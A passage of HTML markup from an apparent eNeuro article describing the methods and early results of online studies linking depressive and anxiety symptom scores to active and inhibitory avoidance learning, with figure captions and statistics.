id="sec-5"><h4>Participants</h4><p id="p-13">We conducted a power analysis using G*Power to detect a small effect size <span id="inline-formula-1"><span><mml:math xmlns:mml="http://www.w3.org/1998/Math/MathML" display="inline"><mml:mo stretchy="false">(</mml:mo><mml:mrow><mml:mspace width=".1em"></mml:mspace><mml:msup><mml:mi>f</mml:mi><mml:mn>2</mml:mn></mml:msup><mml:mo>=</mml:mo><mml:mn>0.02</mml:mn></mml:mrow><mml:mo stretchy="false">)</mml:mo></mml:math></span>
</span>, indicating that a sample size of <em>N</em> = 395 was required to achieve 80% power at <em>α</em> = 0.05. To account for the higher attrition rates typically observed in online studies, we recruited additional participants. Undergraduates (<em>N</em><sub>Undergraduates </sub>= 475) and online workers (<em>N</em><sub>OnlineWorkers </sub>= 292; recruited via Prolific; <a href="http://www.prolific.co/">www.prolific.co</a>) consented to perform an active/inhibitory avoidance task (<em>N</em><sub>Total </sub>= 767). Undergraduates from the University of British Columbia Psychology Human Subjects Pool were compensated a 1% point increase in their course grade; Prolific workers were compensated £10.59/h. The online avoidance task was unsupervised and uninstructed to allow for instrumental learning processes. Participants were excluded for several reasons, including failure to complete the pre-task survey, failure of survey attention checks, failure to reach criterion accuracy during acquisition, obtaining a <em>d</em>’ &lt; 0.50 during the intermixed task stage, or failure to complete the task. After cleaning, <em>N</em><sub>Total </sub>= 465 (<em>N</em><sub>Undergraduates </sub>= 278; <em>N</em><sub>OnlineWorkers </sub>= 187) were included in the analyses. For details on participant exclusion rates, see Discussion and Extended Data (Extended Data <a id="xref-supplementary-material-1-1" href="#DC1">Table 1-1</a>). The study was approved by the University of British Columbia Behavioral Research Ethics Board (BREB) under certificate H20-01388. Demographic information can be found in <a id="xref-table-wrap-1-1" href="#T1">Table 1</a>.</p></div><div id="sec-6"><h4>Materials</h4><div id="sec-7"><h5>Stimuli</h5><p id="p-14">The task was created in PsychoPy 2020.1 (RRID: SCR_006571) and distributed via Pavlovia (<a href="http://www.pavlovia.org/">www.pavlovia.org</a>; <a id="xref-ref-55-1" href="#ref-55">Peirce et al., 2019</a>). Simple shapes signaled the type of response (active vs inhibitory) required to avoid an aversive sound. Coauthor I.D.D. recorded a set of screeching and scraping sounds (i.e., knife on glass, fork on plate, metal on slate), from which 45 were pilot-tested for unpleasantness and salience (<em>N</em> = 45). Using 9-point Likert scales, eight sounds with the highest combined ratings (unpleasantness: <em>M</em> = 6.87–7.57; salience: <em>M</em> = 5.82–6.83) and lowest variance were selected. These eight aversive sounds were randomly presented on failed trials and were found to be highly motivating. In Study 1, 92.46% of participants who responded to a debriefing question (<em>N</em> = 464) endorsed the aversive sounds as motivating to avoid. Rapid acquisition of instrumental avoidance responses further supports the functional aversiveness of the stimuli. On successful trials, a white border around the gray background signaled safety.</p></div><div id="sec-8"><h5>Measures</h5><p id="p-15">Depressive and anxiety symptom scores were derived from the clinically validated Beck Depression Inventory-II (BDI-II; <a id="xref-ref-6-1" href="#ref-6">Beck et al., 1988b</a>; <a id="xref-ref-7-1" href="#ref-7">Beck et al., 1996</a>) and the Beck Anxiety Inventory (BAI; <a id="xref-ref-5-1" href="#ref-5">Beck et al., 1988a</a>), respectively. One question (suicidality ideation) was removed from the BDI-II for ethical considerations. BDI-II symptom scores were calculated as a proportion score (BDI-II<sub>score</sub>/BDI-II<sub>max_possible_score</sub>) for each participant. Similarly, BAI scores are reported as proportion scores (BAI<sub>score</sub>/BAI<sub>max_possible_score</sub>) for consistency and comparability.</p></div></div><div id="sec-9"><h4>Procedure</h4><p id="p-16">Participants were tested on a computer-based avoidance task that was reverse-translated from a rodent operant paradigm assessing active/inhibitory avoidance—with some modifications (<a id="xref-ref-57-3" href="#ref-57">Piantadosi et al., 2018</a>; <a id="xref-ref-14-3" href="#ref-14">Capuzzo and Floresco, 2020</a>). Prior to the avoidance task, participants completed an effort calibration and a volume calibration to control for differences in physical ability and computer systems (see <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>).</p><div id="sec-10"><h5>Active/inhibitory avoidance task</h5><p id="p-17">Specific shapes (circle or squares; counterbalanced) signaled active (“Go”) versus inhibitory (“No-Go”) responses required to avoid a highly aversive sound. The avoidance task consisted of three task stages: acquisition, intermixed, and reversal (<a id="xref-fig-1-1" href="#F1">Fig. 1<em>A</em></a>). (1) The acquisition stage required learning an active avoidance response. During the acquisition stage, participants had to reach a criterion performance of 80% successful trials within the previous 20 trials (maximum 120 trials). Once acquisition criterion was reached, participants performed an additional 30 “over-learning” active avoidance trials before an unsignaled transition into the next task stage. Participants failing to reach criterion performance during the acquisition stage were excluded from data analysis. (2) The intermixed stage required participants to learn the inhibitory avoidance response while flexibly deploying both active and inhibitory responses. This stage consisted of 120 avoidance trials (60 active, 60 inhibitory), presented in a pseudorandomized order. (3) The reversal stage also consisted of 120 avoidance trials (60 active, 60 inhibitory; pseudorandomized), but with active and inhibitory response contingencies reversed. The multiple task stages allowed us to assess distinct patterns in the acquisition and expression of active/inhibitory avoidance, as well as reversal learning. Importantly, participants were not instructed about the cue–response contingencies to allow the acquisition through reinforcement, to mirror the rodent paradigm the task was translated from.</p><div id="F1"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F1.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 1: Active/inhibitory avoidance task. A, Schematic of task stages: acquisition, intermixed, and reversal. Green lines represent active avoidance (“Go”) trials, while red lines represent inhibitory avoidance (“No-Go”) trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 120 trials. Upon reaching criterion, participants completed 30 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory avoidance responses. The reversal stage followed another unsignaled transition, during which the cues signaling active and inhibitory avoidance responses are reversed. B, Successful active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound, as indicated by the safety signal (white border). C, Failed active avoidance: A blue circle signals an active avoidance trial, but insufficient or no keyboard presses (red circle) were made within the 1,200 ms, resulting in an aversive sound (yellow speaker). D, Successful inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, indicated by the safety signal. E, Failed inhibitory avoidance: A blue square signals an inhibitory avoidance trial, but the participant fails to withhold keyboard presses within the 1,200 ms, resulting in an aversive sound." rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 1: Active/inhibitory avoidance task. <strong><em>A</em></strong>, Schematic of task stages: acquisition, intermixed, and reversal. Green lines represent active avoidance (“Go”) trials, while red lines represent inhibitory avoidance (“No-Go”) trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 120 trials. Upon reaching criterion, participants completed 30 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory avoidance responses. The reversal stage followed another unsignaled transition, during which the cues signaling active and inhibitory avoidance responses are reversed. <strong><em>B</em></strong>, Successful active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound, as indicated by the safety signal (white border). <strong><em>C</em></strong>, Failed active avoidance: A blue circle signals an active avoidance trial, but insufficient or no keyboard presses (red circle) were made within the 1,200 ms, resulting in an aversive sound (yellow speaker). <strong><em>D</em></strong>, Successful inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, indicated by the safety signal. <strong><em>E</em></strong>, Failed inhibitory avoidance: A blue square signals an inhibitory avoidance trial, but the participant fails to withhold keyboard presses within the 1,200 ms, resulting in an aversive sound.</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 1." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F1.medium.gif" width="440" height="230" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F1.large.jpg?download=true" title="Download Figure 1." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F1.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811685" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div xmlns:xhtml="http://www.w3.org/1999/xhtml"><p><span>Figure 1.</span></p><p id="p-18">Study 1: Active/inhibitory avoidance task. <strong><em>A</em></strong>, Schematic of task stages: acquisition, intermixed, and reversal. Green lines represent active avoidance (“Go”) trials, while red lines represent inhibitory avoidance (“No-Go”) trials. The black arrow indicates time progression. During acquisition, participants were required to reach a criterion of 80% correct active avoidance trials over a 20-trial period (i.e., initial acquisition) or complete a maximum of 120 trials. Upon reaching criterion, participants completed 30 over-learning trials, followed by an unsignaled transition into the intermixed stage. In this stage, participants flexibly alternated between active and inhibitory avoidance responses. The reversal stage followed another unsignaled transition, during which the cues signaling active and inhibitory avoidance responses are reversed. <strong><em>B</em></strong>, Successful active avoidance: A blue circle signals an active avoidance trial. The participant makes sufficient keyboard presses (green circles) within 1,200 ms cue period, avoiding an aversive sound, as indicated by the safety signal (white border). <strong><em>C</em></strong>, Failed active avoidance: A blue circle signals an active avoidance trial, but insufficient or no keyboard presses (red circle) were made within the 1,200 ms, resulting in an aversive sound (yellow speaker). <strong><em>D</em></strong>, Successful inhibitory avoidance: A blue square signals an inhibitory avoidance trial. The participant withholds keyboard presses for the full 1,200 ms, avoiding an aversive sound, indicated by the safety signal. <strong><em>E</em></strong>, Failed inhibitory avoidance: A blue square signals an inhibitory avoidance trial, but the participant fails to withhold keyboard presses within the 1,200 ms, resulting in an aversive sound.</p></div></div><p id="p-19">Trials began with a fixation cross onscreen (ISI; 2,000 ms; jittered 1,200 ms). Active avoidance required an effortful response—specifically, 3, 4, or 5 rapid button presses (criterion determined during effort calibration test). On successful active trials (<a id="xref-fig-1-2" href="#F1">Fig. 1<em>B</em></a>), participants made the required response within the cue period (≤1,200 ms), resulting in the avoidance of the aversive sound and the presentation of a safety signal (1,000 ms). On failed active trials (<a id="xref-fig-1-3" href="#F1">Fig. 1<em>C</em></a>), either an insufficient response or no response within the cue period triggered the aversive sound (1,000 ms). On inhibitory trials, participants were required to withhold responding. On successful inhibitory trials (<a id="xref-fig-1-4" href="#F1">Fig. 1<em>D</em></a>), participants made no button presses during the cue period (1,200 ms), resulting in the avoidance of the aversive sound and the presentation of a safety signal (1,000 ms). On failed inhibitory trials (<a id="xref-fig-1-5" href="#F1">Fig. 1<em>E</em></a>), an erroneous button press triggered the aversive sound. A graphical overview of the avoidance task is provided in <a id="xref-fig-1-6" href="#F1">Figure 1</a>.</p></div></div><div id="sec-11"><h4>Statistical analysis</h4><p id="p-20">All analyses were conducted in R 4.2.1 (<a id="xref-ref-58-1" href="#ref-58">R Core Team, 2013</a>) using RStudio (<a id="xref-ref-11-1" href="#ref-11">Booth et al., 2018</a>). Primary outcome measures included proportion correct for active and inhibitory trials across task stages and the number of trials to criterion during acquisition. Within-subjects ANOVAs were used except where otherwise stated. Significant main effects or interactions were followed by pairwise comparisons using the <em>emmeans</em> package (<a id="xref-ref-62-1" href="#ref-62">Searle et al., 1980</a>; <a id="xref-ref-44-1" href="#ref-44">Lenth, 2017</a>), with Tukey's honest significant difference (HSD) correction. Between-subject ANOVAs tested sex and sample effects on BDI-II scores. To examine individual differences, we used regression and linear mixed models (lmerTest; fit by REML, <em>t</em> tests using Satterthwaite's method; <a id="xref-ref-4-1" href="#ref-4">Bates et al., 2015</a>; <a id="xref-ref-41-1" href="#ref-41">Kuznetsova et al., 2017</a>) to assess BDI-II scores effects on task performance. To account for multiple comparisons, the Benjamini–Hochberg false discovery rate (FDR) correction was applied (<a id="xref-ref-8-1" href="#ref-8">Benjamini and Hochberg, 1995</a>). We present only the BDI-II analyses in the main text, while corresponding analyses for BAI scores are presented in Extended Data (Extended Data <a id="xref-supplementary-material-2-1" href="#DC2">Figs. 2-1</a>, <a id="xref-supplementary-material-4-1" href="#DC4">4-1</a>; Extended Data <a id="xref-supplementary-material-5-1" href="#DC5">Tables 3-1</a>, 3-3).</p></div></div><div id="sec-12"><h3>Study 2 (reward-seeking/avoidance)</h3><div id="sec-13"><h4>Participants</h4><p id="p-21">Undergraduate participants (<em>N</em> = 771) from the University of British Columbia Psychology Human Subjects Pool were recruited to perform a reward-seeking/avoidance task. Power analysis procedures were identical to Study 1. Recruitment focused exclusively on undergraduates, as effects in Study 1 were strongest in this population. Compensation was identical to the undergraduate sample in Study 1. To motivate performance during reward-seeking trials, participants were told their accumulated points would contribute to the value of a gift card, although participants ultimately received a $5 gift card regardless of performance. Exclusion criteria were similar to Study 1, with the added requirement that participants reach criterion accuracy during acquisition for both reward-seeking and avoidance trials independently. Because the task was designed as a reinforcement-based learning paradigm—with minimal instructions, no explicit information about contingencies, and no practice trials—and given variability in motivation among undergraduates completing online studies for credit, exclusions rates were higher than expected, resulting in lower-than-ideal power. For details on participant exclusion rates, see Discussion and Extended Data (Extended Data <a id="xref-supplementary-material-1-2" href="#DC1">Table 1-1</a>). After cleaning, the final sample included <em>N</em> = 330 participants (<em>N</em><sub>female</sub> = 245; <em>N</em><sub>male</sub> = 85). The study was approved by the University of British Columbia Behavioral Research Ethics Board (BREB) under certificate H20-01388. Demographic information for Study 2 can be found in <a id="xref-table-wrap-1-2" href="#T1">Table 1</a>.</p><div id="T1"><p><span>Table 1.</span></p><p id="p-22">Demographic information for all participants</p></div></div><div id="sec-14"><h4>Materials</h4><div id="sec-15"><h5>Stimuli and measures</h5><p id="p-25">The task was implemented using PsychoPy and Pavlovia (same as Study 1) with modification to incorporate reward-seeking trials. Stimuli included four simple shapes (blue; square, circle, triangle, hexagon) counterbalanced across response type (active vs inhibitory) and motivational context (reward-seeking vs avoidance). As in Study 1, participants completed questionnaire measures, effort, and volume calibrations procedures.</p></div><div id="sec-16"><h5>Mixed-motivation go/no-go task</h5><p id="p-26">The mixed-motivation task consisted of two stages: (1) an acquisition stage, where participants learned active reward-seeking and active avoidance responses, and (2) an intermixed stage, which required the flexible expression of active and inhibitory responses across reward-seeking and avoidance contexts. During the acquisition stage, participants had to reach 80% accuracy within the previous 20 trials, independently for both active reward-seeking and active avoidance trials. After reaching the acquisition criterion, participants completed 24 “over-learning” trials (12 reward-seeking and 12 avoidance) before an unsignaled transition into the intermixed stage. Participants who failed to reach criterion were excluded from analysis. The intermixed stage consisted of 240 trials (60 of each type—active reward-seeking, inhibitory reward-seeking, active avoidance, inhibitory avoidance), presented in a pseudorandomized order. The reversal stage used in Study 1 was omitted.</p><p id="p-27">Trials began with a fixation cross (ISI; 2,000 ms; jittered 1,200 ms). Active responses required 3, 4, or 5 button presses within the 1,200 ms cue period (threshold determined during effort calibration). On successful trials, participants either earned 5 points or avoided an aversive sound, depending on the motivational context. Successful reward-seeking trials provided a reward signal (1,000 ms; white border), while successful avoidance trials were followed by a safety signal (1,000 ms; white border). On failed trials, participants either received no points (reward-seeking) or were presented with an aversive sound (avoidance). Points accumulated were displayed on reward-seeking trials, and a musical tone (C major chord; 1,100 ms) played each time participants earned an additional 25 points.</p></div></div><div id="sec-17"><h4>Statistical analysis</h4><p id="p-28">Analytical procedures followed Study 1. Accuracy (proportion correct) and trials to criterion during acquisition were the primary outcomes. Linear mixed models tested BDI-II symptom scores effects on active and inhibitory accuracy across motivational contexts. FDR corrections were used for multiple comparisons.</p></div></div><div id="sec-18"><h3>Code accessibility</h3><p id="p-29">No computational neuroscience models were developed for this study. However, extended data and code used to conduct the linear mixed models are available at <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>.</p></div></div><div id="sec-19"><h2>Results</h2><div id="sec-20"><h3>Study 1 (avoidance)</h3><div id="sec-21"><h4>Demographics</h4><p id="p-30">To assess differences between undergraduates and online workers, we first compared self-reported depressive and anxiety symptom scores. There was no difference in depressive symptom scores (<em>F</em><sub>(1,463)</sub> = 0.34, <em>p</em> = 0.56; <a id="xref-fig-2-1" href="#F2">Fig. 2<em>A</em></a>), but undergraduates reported significantly higher anxiety symptom scores compared with online workers (<em>F</em><sub>(1,463)</sub> = 13.84, <em>p</em> &lt; 0.001; Extended Data <a id="xref-supplementary-material-2-2" href="#DC2">Fig. 2-1</a>). Sex and gender responses were highly congruent (&gt;96%); due to limited statistical power for non-cis gender categories, subsequent analyses refer to sex only. Females reported higher depressive (<em>F</em><sub>(1,463)</sub> = 7.96, <em>p</em> &lt; 0.01; <a id="xref-fig-2-2" href="#F2">Fig. 2<em>B</em></a>) and higher anxiety (<em>F</em><sub>(1,463)</sub> = 33.63, <em>p</em> &lt; 0.001; Extended Data <a id="xref-supplementary-material-2-3" href="#DC2">Fig. 2-1</a>) symptom scores than males. Finally, there was a significant age difference between samples (<em>F</em><sub>(1,462)</sub> = 299.8, <em>p</em> &lt; 0.001), with undergraduates being younger on average compared with online workers (Extended Data <a id="xref-supplementary-material-3-1" href="#DC3">Fig. 2-2</a>).</p><div id="F2"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F2.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 1: Distribution of depressive symptom scores across samples and sexes. Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) scores. A, Depressive symptom score distributions by sample: Undergraduates (red) and Online Workers (blue). B, Depressive symptom score distributions by sex: Female (red) and Male (blue). The x-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the x-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical lines represent the mean BDI-II symptom score for each group. In panel B, a significant difference in depressive levels between sexes is indicated (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 1: Distribution of depressive symptom scores across samples and sexes.<strong> </strong>Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) scores. <strong><em>A</em></strong>, Depressive symptom score distributions by sample: Undergraduates (red) and Online Workers (blue). <strong><em>B</em></strong>, Depressive symptom score distributions by sex: Female (red) and Male (blue). The <em>x</em>-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the <em>x</em>-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical lines represent the mean BDI-II symptom score for each group. In panel <strong><em>B</em></strong>, a significant difference in depressive levels between sexes is indicated (<em>p</em> < 0.01), with females scoring higher on average than males. See Extended Data Figures 2-1 (BAI distributions) and 2-2 (Age distributions).</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 2." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F2.medium.gif" width="440" height="226" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F2.large.jpg?download=true" title="Download Figure 2." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F2.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811670" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 2.</span></p><p id="p-31">Study 1: Distribution of depressive symptom scores across samples and sexes.<strong> </strong>Density plots representing the distribution of Beck Depression Inventory-II (BDI-II) scores. <strong><em>A</em></strong>, Depressive symptom score distributions by sample: Undergraduates (red) and Online Workers (blue). <strong><em>B</em></strong>, Depressive symptom score distributions by sex: Female (red) and Male (blue). The <em>x</em>-axis represents proportion scores, where raw BDI-II symptom scores, ranging from 0 to 60, have been divided by the maximum possible score (60) to produce a proportion between 0 and 1. This adjustment was made because the suicide ideation question was removed for ethical consideration. The labels on the <em>x</em>-axis—Minimal (0–13), Mild-Moderate (14–28), Severe (29–63)—reflect typical ranges of raw symptom scores for ease of interpretation. Dashed vertical lines represent the mean BDI-II symptom score for each group. In panel <strong><em>B</em></strong>, a significant difference in depressive levels between sexes is indicated (<em>p</em> &lt; 0.01), with females scoring higher on average than males. See Extended Data <a id="xref-supplementary-material-2-4" href="#DC2">Figures 2-1</a> (BAI distributions) and <a id="xref-supplementary-material-3-2" href="#DC3">2-2</a> (Age distributions).</p></div></div><div id="DC2"><h3>Figure 2-1</h3><p id="p-32"><strong>Study 1: Distribution of Anxiety Scores Across Samples and Sexes.</strong> Density plots representing the distribution of Beck Anxiety Inventory (BAI) scores. <strong>A)</strong> Anxiety score distributions by sample: Undergraduates (red) and Online Workers (blue). <strong>B)</strong> Anxiety score distributions by sex: Female (red) and Male (blue). The x-axis represents proportion scores, where raw BAI scores, ranging from 0-63, have been divided by the maximum possible score (63) to produce a proportion between 0 and 1. This adjustment was made for comparability between the BDI-II and BAI scales. The labels on the x-axis -- Minimal (0-7), Mild-Moderate (8-25), Severe (26-63) -- reflect typical ranges of raw scores for ease of interpretation. Dashed vertical lines represent the mean BAI score for each group. In panel A, a significant difference in anxiety levels between sample groups is indicated (<em>p</em> &lt; .001), with undergraduates scoring higher on average than online workers. In panel B, a significant difference in anxiety levels between sexes is indicated (<em>p</em> &lt; .001), with females scoring higher on average than males. Download <span><span id="DC2"><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/DC2/embed/inline-supplementary-material-2.tif?download=true" data-icon-position="" data-hide-link-title="0"><span></span>Figure 2-1, TIF file</a></span></span>.</p></div><div id="DC3"><h3>Figure 2-2</h3><p id="p-33"><strong>Study 1: Age Distribution Across Samples.</strong> Density plot representing the distribution of ages for undergraduates (red) and online workers (blue). Dashed vertical lines represent the mean age for each group. A significant difference in age between the samples are indicated (<em>p</em> &lt; .001), with online workers being older on average compared to undergraduates. Download <span><span id="DC3"><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/DC3/embed/inline-supplementary-material-3.tif?download=true" data-icon-position="" data-hide-link-title="0"><span></span>Figure 2-2, TIF file</a></span></span>.</p></div></div><div id="sec-22"><h4>Avoidance task</h4><div id="sec-23"><h5>Within-subject results</h5><p id="p-34"><em>Acquisition</em>. The acquisition task stage assessed initial learning of the active avoidance response. Participants showed robust acquisition, with an average accuracy of 0.79 (SD = 0.15; <a id="xref-fig-3-1" href="#F3">Fig. 3<em>A</em></a>). The mean number of trials to reach criterion (≥80% correct in 20 trial period) was 29.65 (SD = 18.42; range, 16–120 trials; <a id="xref-fig-4-1" href="#F4">Fig. 4<em>A</em></a>). Higher BDI-II scores were associated with a greater number of trials needed to reach criterion during acquisition, but this effect was specific to undergraduates (<a id="xref-fig-4-2" href="#F4">Fig. 4<em>B</em></a>; see <a href="https://osf.io/5sepm/">https://osf.io/5sepm/</a>).</p><div id="F3"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F3.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 1: Avoidance performance across task stages. Proportion correct for active (green) and inhibitory (red) avoidance responses across three task stages: A, Acquisition; B, intermixed, and C, reversal. The left panels display overall accuracy, with circles representing individual participant performance for active and inhibitory avoidance, respectively. The right panels show accuracy across blocks of six trials, with circles representing mean performance for each avoidance type. Proportion correct reflects the ratio of successful avoidance responses relative to the total number of trials for each avoidance type. Significant differences between active and inhibitory avoidance during the intermixed and reversal stages are indicated (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 1: Avoidance performance across task stages. Proportion correct for active (green) and inhibitory (red) avoidance responses across three task stages: <strong><em>A</em></strong>, Acquisition; <strong><em>B</em></strong>, intermixed, and <strong><em>C</em></strong>, reversal. The left panels display overall accuracy, with circles representing individual participant performance for active and inhibitory avoidance, respectively. The right panels show accuracy across blocks of six trials, with circles representing mean performance for each avoidance type. Proportion correct reflects the ratio of successful avoidance responses relative to the total number of trials for each avoidance type. Significant differences between active and inhibitory avoidance during the intermixed and reversal stages are indicated (<em>p</em> < 0.001).</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 3." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F3.medium.gif" width="440" height="209" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F3.large.jpg?download=true" title="Download Figure 3." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F3.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811686" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 3.</span></p><p id="p-35">Study 1: Avoidance performance across task stages. Proportion correct for active (green) and inhibitory (red) avoidance responses across three task stages: <strong><em>A</em></strong>, Acquisition; <strong><em>B</em></strong>, intermixed, and <strong><em>C</em></strong>, reversal. The left panels display overall accuracy, with circles representing individual participant performance for active and inhibitory avoidance, respectively. The right panels show accuracy across blocks of six trials, with circles representing mean performance for each avoidance type. Proportion correct reflects the ratio of successful avoidance responses relative to the total number of trials for each avoidance type. Significant differences between active and inhibitory avoidance during the intermixed and reversal stages are indicated (<em>p</em> &lt; 0.001).</p></div></div><div id="F4"><div><div><p><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F4.large.jpg?width=800&amp;height=600&amp;carousel=1" title="Study 1: Trials to criterion for active avoidance during the acquisition stage. A, Number of trials required to reach criterion for all participants in the avoidance task. Individual data points (green circles) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. B, Interaction between depressive symptom scores (BDI-II proportion scores) and the sample group (Undergraduates vs Online Workers) predicting trials to criterion for active avoidance. The regression lines show the relationship between depressive symptom scores and trials to criterion for each sample, with a stronger effect observed in undergraduates (β = 24.57) compared with online workers (β = 1.09). A significant main effect of BDI-II symptom scores (p " rel="gallery-fragment-images-593667592" data-figure-caption="<div class=&quot;highwire-markup&quot;><div xmlns=&quot;http://www.w3.org/1999/xhtml&quot;>Study 1: Trials to criterion for active avoidance during the acquisition stage. <strong><em>A</em></strong>, Number of trials required to reach criterion for all participants in the avoidance task. Individual data points (green circles) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. <strong><em>B</em></strong>, Interaction between depressive symptom scores (BDI-II proportion scores) and the sample group (Undergraduates vs Online Workers) predicting trials to criterion for active avoidance. The regression lines show the relationship between depressive symptom scores and trials to criterion for each sample, with a stronger effect observed in undergraduates (<em>β</em> = 24.57) compared with online workers (<em>β</em> = 1.09). A significant main effect of BDI-II symptom scores (<em>p</em> < 0.001) and a significant BDI-II × Sample interaction (<em>p</em> < 0.05) are indicated. See Extended Data Figure 4-1 for corresponding BAI effects.</div></div>" data-icon-position="" data-hide-link-title="0"><span><img alt="Figure 4." src="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F4.medium.gif" width="440" height="311" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></a></p></div><ul><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F4.large.jpg?download=true" title="Download Figure 4." data-icon-position="" data-hide-link-title="0">Download figure</a></li><li><a href="https://www.eneuro.org/content/eneuro/12/9/ENEURO.0034-25.2025/F4.large.jpg" target="_blank" data-icon-position="" data-hide-link-title="0">Open in new tab</a></li><li><a href="https://www.eneuro.org/highwire/powerpoint/3811677" data-icon-position="" data-hide-link-title="0">Download powerpoint</a></li></ul></div><div><p><span>Figure 4.</span></p><p id="p-36">Study 1: Trials to criterion for active avoidance during the acquisition stage. <strong><em>A</em></strong>, Number of trials required to reach criterion for all participants in the avoidance task. Individual data points (green circles) represent the number of trials each participant required to reach the criterion of 80% correct responses within 20-trial period during acquisition. <strong><em>B</em></strong>, Interaction between depressive symptom scores (BDI-II proportion scores) and the sample group (Undergraduates vs Online Workers) predicting trials to criterion for active avoidance. The regression lines show the relationship between depressive symptom scores and trials to criterion for each sample, with a stronger effect observed in undergraduates (<em>β</em> = 24.57) compared with online workers (<em>β</em> = 1.09). A significant main effect of BDI-II symptom scores (<em>p</em> &lt; 0.001) and a significant BDI-II × Sample interaction (<em>p</em> &lt; 0.05) are indicated. See Extended Data <a id="xref-supplementary-material-4-2" href="#DC4">Figure 4-1</a> for corresponding BAI effects.</p></div></div><div id="DC4"><h3>Figure 4-1</h3><p id="p-37"><strong>Study 1: Trials to Criterion for Active Avoidance During the Acquisition Stage</strong>. <strong>A)</strong> Number of trials required to reach criterion for all participants in the avoidance task. Individual data points 